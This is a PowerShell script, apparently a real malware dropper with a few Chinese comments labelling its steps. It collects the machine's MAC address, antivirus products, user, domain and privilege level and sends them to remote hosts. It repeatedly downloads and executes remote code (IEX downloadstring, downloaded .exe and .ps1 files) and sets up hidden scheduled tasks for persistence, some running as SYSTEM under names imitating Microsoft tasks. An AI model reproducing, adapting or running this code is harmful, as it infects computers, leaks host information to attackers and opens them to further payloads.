[string]$av = ""

[string]$avs = ""

[string]$mac = "00-00-00-00-00-00"
# 获取MAC地址
[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
# 获取杀毒软件名称
$avs = (Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName

if($avs.GetType().name.IndexOf('Object') -gt -1){

	for($v = 0; $v -lt $avs.Count; $v++){

		$av += $avs[$v] + "|"

	}

}else{
# Windows Defender
$av = $avs

}
# 探测是否包含zhudongfangyu服务
try{

	if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq "Running"){

		$av += 'ZDFY'

	}

}catch{}

[System.Threading.Thread]::Sleep((Get-Random -Minimum 20000 -Maximum 400000))

# 判断是否为管理员权限
$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

$status = '|'
# C:\Users\abc\AppData\Local\Temp\\kkk1.log
$path = "$env:temp\\kkk1.log"

[string]$flag = test-path $path

$path2 = "$env:temp\\pp2.log"

[string]$flag2 = test-path $path2

$path3 = "$env:temp\\333.log"

[string]$flag3 = test-path $path3

$path4 = "$env:temp\\kk4.log"

[string]$flag4 = test-path $path4

$path5 = "$env:temp\\kk5.log"

[string]$flag5 = test-path $path5

try{

	$name = 'Global\powerv5'

	$psflag = $flase

	New-Object System.Threading.Mutex ($true,$name,[ref]$psflag)

}catch{}


# 当前日期时间230905
$dt = Get-Date -Format 'yyMMdd'

$key = "&mac="+$mac+"&av="+$av+"&version="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + "&flag2=" + $flag + "&domain=" + (Get-WmiObject win32_computersystem).Domain + "&user=" + $env:USERNAME + "&PS=" + $psflag

# C:\Users\abc\AppData\Local\Temp\\kkk1.log 如果无该路径
if($flag -eq 'False'){
	# 创建C:\Users\abc\AppData\Local\Temp\\kkk1.log
	New-Item $path -type file

	try{

		if($permit){

			$status += 'PHig|'
			# 高权限？
			$Text = "IEX (New-Object Net.WebClient).downloadstring('http://v.y6h.net/g?h" + $dt + "')"

			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

			$bcode = [Convert]::ToBase64String($Bytes)
			# 创建计划任务
			$ccc = 'schtasks /query /tn "\Microsoft\windows\' + $mac + '" || schtasks /create /ru system /sc MINUTE /mo 45 /st 07:00:00 /tn "\Microsoft\windows\' + $mac + '" /tr "powershell -nop -ep bypass -e ' + $bcode +'" /F'

			&cmd.exe /c $ccc

		}else{
			# 低权限？
			$status += 'PLow|'

			$Text = "IEX (New-Object Net.WebClient).downloadstring('http://v.y6h.net/g?l" + $dt + "')"

			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

			$bcode = [Convert]::ToBase64String($Bytes)

			$ccc = 'schtasks /query /tn "' + $mac + '" || schtasks /create /sc MINUTE /mo 45 /st 07:00:00 /tn "' + $mac + '" /tr "powershell -nop -ep bypass -e ' + $bcode +'" /F'

			&cmd.exe /c $ccc

		}

	}catch{}

}else{}


if($flag2 -eq 'False'){

	New-Item $path2 -type file

	try{

		try{

			mkdir "$env:appdata\\Microsoft"

		}catch{}

		

		$file = "$env:appdata\\Microsoft\\cred.ps1"

		$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum

		if($size -ne 3159314){

			$url = 'http://down.beahh.com/new.dat?allv5' + $key

			(New-Object System.Net.WebClient).DownloadFile($url,"$file")

		}else{

		$status += 'PSold|'

		}

		$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum

		if($size -eq 3159314){

			$status += 'PSok|'

			if ($permit){

			&cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr "powershell -nop -w hidden -ep bypass -f %appdata%\Microsoft\cred.ps1" /F

			}else{

			&cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr "powershell -nop -w hidden -ep bypass -f %appdata%\Microsoft\cred.ps1" /F

			}

			&cmd.exe /c schtasks /run /tn Credentials

		}else{$status += 'PSerror|'}

		

	}catch{}

}else{

$status += 'PSold2|'

}


if($flag3 -eq 'False'){

	New-Item $path3 -type file

	$status += 'MN|'

	try{

	$mnfile = "$env:temp\\mn.exe"

	$url = 'http://down.beahh.com/mn.dat?allv5' + $key

	(New-Object System.Net.WebClient).DownloadFile($url,"$mnfile")

	$exec = New-Object -com shell.application

	$exec.shellexecute($mnfile)

	}catch{}

}else{}


[string]$tmpsize = ''

$tmpsize = Get-ChildItem -path $env:temp\*.exe | Where-Object  {$_.Length -eq '6967008'}

if(($flag4 -eq 'False') -and ($tmpsize.length -eq '0')){

	New-Item $path4 -type file

	try{

	$url = 'http://down.beahh.com/ii.dat?p=allv5' + $key

	$pname = -join ([char[]](97..122) | Get-Random -Count (Get-Random -Minimum 4 -Maximum 8))

	$pnamepath = $pname + '.exe'

	$pnamepath = "$env:temp\" + $pnamepath

	$wc = New-Object System.Net.WebClient

	$wc.DownloadFile($url, $pnamepath)

	$status += 'EBerror|'

	$dsize = (Get-ChildItem $pnamepath -Force -recurse | Measure-Object -property length -sum).sum

	if($dsize -eq '6967008'){

		if($permit){

			&cmd.exe /c schtasks /create /ru SYSTEM /sc MINUTE /mo 10 /st 07:00:00 /tn "\Microsoft\Windows\$pname" /tr "$pnamepath" /F

			$status += 'EBok|'

		}else{

			'Set ws = CreateObject("Wscript.Shell")' | Out-File $env:temp\\run.vbs

			'ws.run "cmd /c ' + $pnamepath + '",vbhide' | Out-File -Append $env:temp\\run.vbs

			&cmd.exe /c schtasks /create /sc MINUTE /mo 10 /st 07:00:00 /tn "$pname" /tr "$env:temp\\run.vbs" /F

			$status += 'EBokvbs|'

		}

	}else{}

	}catch{}

}else{

	$status += 'EBold|'

}


if(($flag5 -eq 'False') -and $permit){

	New-Item $path5 -type file

	$status += 'AIO|'

	try{

	$ddfile = "$env:temp\\ddd.exe"

	$url = 'http://down.beahh.com/ddd.dat?allv5' + $key

	(New-Object System.Net.WebClient).DownloadFile($url,"$ddfile")

	$exec = New-Object -com shell.application

	$exec.shellexecute($ddfile)

	}catch{}

}else{}


try{

	$download = 'http://27.102.107.137/status.json?allv5' + $key + "&" + $status + "&" + $MyInvocation.MyCommand.Definition

	IEX (New-Object Net.WebClient).DownloadString("$download")

}catch{}


try{

	if($psflag){

	$onps = "/c powershell -nop -w hidden -ep bypass -c " + '"' + "IEX (New-Object Net.WebClient).downloadstring('" + "http://down.beahh.com/newol.dat?allv5" + $key + "')" + '"'

	Start-Process -FilePath cmd.exe -ArgumentList "$onps"

	}else{}

}catch{}



[System.Threading.Thread]::Sleep(3000)

#Stop-Process -Force -processname powershell


